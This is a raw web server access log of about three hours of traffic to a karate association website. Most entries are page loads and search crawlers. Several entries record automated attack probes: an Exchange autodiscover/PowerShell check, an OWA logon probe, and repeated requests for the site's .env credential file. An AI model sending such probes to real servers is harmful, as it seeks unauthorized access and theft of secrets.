::ffff:64.62.197.110 - - [06/Dec/2022:05:01:34 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:192.241.207.208 - - [06/Dec/2022:05:04:08 +0000] "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1" 404 169 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/JohnArce.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/tm.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/books/MBS.gif HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/books/MBS2.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/books/karatebook.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/books/shotokanSecrets.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/books/ZenMeditation.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/books/dummies.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/books/bookoffiverings.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/books/KarateDoZen.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/books/bobook.gif HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/books/saibook.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/books/dojoWisdom.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/books/karatedo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/books/guide20.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/books/karatedojo.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/books/emptyHand.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/books/movingzen.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/books/artofwar.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/books/grappingmethod.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:32 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:36 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:136.22.79.3 - - [06/Dec/2022:05:04:44 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
::ffff:198.235.24.31 - - [06/Dec/2022:05:10:17 +0000] "GET / HTTP/1.1" 200 57378 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:54.36.148.86 - - [06/Dec/2022:05:16:36 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.3 - - [06/Dec/2022:05:16:38 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:183.136.225.32 - - [06/Dec/2022:05:19:09 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
::ffff:183.136.225.32 - - [06/Dec/2022:05:24:39 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::ffff:183.136.225.32 - - [06/Dec/2022:05:24:39 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::ffff:183.136.225.32 - - [06/Dec/2022:05:24:40 +0000] "GET /ie7/ie7-standard-p.js HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::ffff:183.136.225.32 - - [06/Dec/2022:05:25:45 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::ffff:114.119.159.135 - - [06/Dec/2022:05:27:37 +0000] "GET /events HTTP/1.1" 200 5867 "https://wadokikai.org/joinemail?type=blackbeltclasses" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:73.93.253.46 - - [06/Dec/2022:05:27:53 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:157.55.39.153 - - [06/Dec/2022:05:30:28 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:73.93.253.46 - - [06/Dec/2022:05:45:12 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:89.142.169.22 - - [06/Dec/2022:05:51:13 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::ffff:66.240.236.116 - - [06/Dec/2022:05:51:44 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:185.213.154.213 - - [06/Dec/2022:05:55:19 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; rv:105.0) Gecko/20100101 Firefox/105.0"
::ffff:158.51.81.68 - - [06/Dec/2022:06:00:38 +0000] "GET / HTTP/1.1" 304 - "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
::ffff:158.51.81.68 - - [06/Dec/2022:06:00:38 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
::ffff:158.51.81.68 - - [06/Dec/2022:06:00:38 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
::ffff:158.51.81.68 - - [06/Dec/2022:06:00:38 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
::ffff:158.51.81.68 - - [06/Dec/2022:06:00:38 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
::ffff:158.51.81.68 - - [06/Dec/2022:06:00:38 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
::ffff:158.51.81.68 - - [06/Dec/2022:06:00:38 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
::ffff:158.51.81.68 - - [06/Dec/2022:06:00:38 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
::ffff:158.51.81.68 - - [06/Dec/2022:06:00:38 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
::ffff:158.51.81.68 - - [06/Dec/2022:06:00:38 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
::ffff:158.51.81.68 - - [06/Dec/2022:06:00:38 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
::ffff:158.51.81.68 - - [06/Dec/2022:06:00:38 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
::ffff:158.51.81.68 - - [06/Dec/2022:06:00:38 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
::ffff:73.93.253.46 - - [06/Dec/2022:06:02:32 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:141.255.166.2 - - [06/Dec/2022:06:06:04 +0000] "GET / HTTP/1.1" 200 57378 "-" "Hello World"
::ffff:205.210.31.11 - - [06/Dec/2022:06:20:54 +0000] "GET / HTTP/1.0" 200 57378 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:45.9.110.186 - - [06/Dec/2022:06:31:51 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
::ffff:73.93.253.46 - - [06/Dec/2022:06:33:54 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:114.119.133.249 - - [06/Dec/2022:06:51:59 +0000] "GET /joinemail?type=blackbeltclasses HTTP/1.1" 200 8998 "http://34.212.47.6/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:114.119.152.139 - - [06/Dec/2022:06:54:49 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 200 691794 "http://34.212.47.6/resources" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:192.241.209.59 - - [06/Dec/2022:07:01:08 +0000] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 404 158 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:54.91.219.252 - - [06/Dec/2022:07:11:42 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0"
::ffff:54.91.219.252 - - [06/Dec/2022:07:11:42 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0"
::ffff:141.255.166.2 - - [06/Dec/2022:07:13:57 +0000] "GET / HTTP/1.1" 200 57378 "-" "Hello World"
::ffff:73.93.253.46 - - [06/Dec/2022:07:15:10 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:198.235.24.150 - - [06/Dec/2022:07:20:01 +0000] "GET / HTTP/1.1" 200 57378 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:73.93.253.46 - - [06/Dec/2022:07:32:30 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:207.154.200.192 - - [06/Dec/2022:07:41:16 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
::ffff:185.254.196.115 - - [06/Dec/2022:07:49:42 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [06/Dec/2022:07:49:42 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:73.93.253.46 - - [06/Dec/2022:07:49:50 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:94.130.237.169 - - [06/Dec/2022:07:50:36 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:94.130.237.169 - - [06/Dec/2022:07:50:36 +0000] "GET /sitemap HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:94.130.237.169 - - [06/Dec/2022:07:50:38 +0000] "GET /sitemap.txt HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:94.130.237.169 - - [06/Dec/2022:07:50:47 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:94.130.237.169 - - [06/Dec/2022:07:50:56 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:94.130.237.169 - - [06/Dec/2022:07:51:01 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:94.130.237.169 - - [06/Dec/2022:07:51:16 +0000] "GET /contact?s=1&ss=10 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:94.130.237.169 - - [06/Dec/2022:07:51:24 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:94.130.237.169 - - [06/Dec/2022:07:51:33 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:94.130.237.169 - - [06/Dec/2022:07:51:37 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:94.130.237.169 - - [06/Dec/2022:07:51:44 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:94.130.237.169 - - [06/Dec/2022:07:51:48 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:94.130.237.169 - - [06/Dec/2022:07:51:51 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:94.130.237.169 - - [06/Dec/2022:07:52:09 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:94.130.237.169 - - [06/Dec/2022:07:52:25 +0000] "GET /contact?s=1&ss=8 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:94.130.237.169 - - [06/Dec/2022:07:52:49 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:94.130.237.169 - - [06/Dec/2022:07:52:50 +0000] "GET /contact?s=1&ss=9 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:94.130.237.169 - - [06/Dec/2022:07:52:54 +0000] "GET /events HTTP/1.1" 200 5867 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:94.130.237.169 - - [06/Dec/2022:07:53:01 +0000] "GET /resources HTTP/1.1" 200 194907 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:94.130.237.169 - - [06/Dec/2022:07:53:05 +0000] "GET /schools HTTP/1.1" 200 97308 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:92.118.39.29 - - [06/Dec/2022:07:58:34 +0000] "GET / HTTP/1.1" 200 57378 "-" "-"
::ffff:37.139.53.82 - - [06/Dec/2022:08:04:39 +0000] "GET / HTTP/1.0" 200 57378 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.44 Safari/537.36 OPR/69.0.3686.7 (Edition beta)"
::ffff:37.139.53.82 - - [06/Dec/2022:08:04:40 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.44 Safari/537.36 OPR/69.0.3686.7 (Edition beta)"
::ffff:37.139.53.82 - - [06/Dec/2022:08:04:40 +0000] "GET /?err=error HTTP/1.0" 200 57930 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.44 Safari/537.36 OPR/69.0.3686.7 (Edition beta)"
::ffff:135.125.246.189 - - [06/Dec/2022:08:13:47 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [06/Dec/2022:08:13:47 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:73.93.253.46 - - [06/Dec/2022:08:25:20 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:141.255.166.2 - - [06/Dec/2022:08:36:05 +0000] "GET / HTTP/1.1" 200 57378 "-" "Hello World"
::ffff:64.62.197.162 - - [06/Dec/2022:08:40:11 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.117"
::ffff:73.93.253.46 - - [06/Dec/2022:08:42:40 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:64.62.197.165 - - [06/Dec/2022:08:43:00 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15"
::ffff:109.123.236.65 - - [06/Dec/2022:08:45:14 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
::ffff:109.123.236.65 - - [06/Dec/2022:08:45:15 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
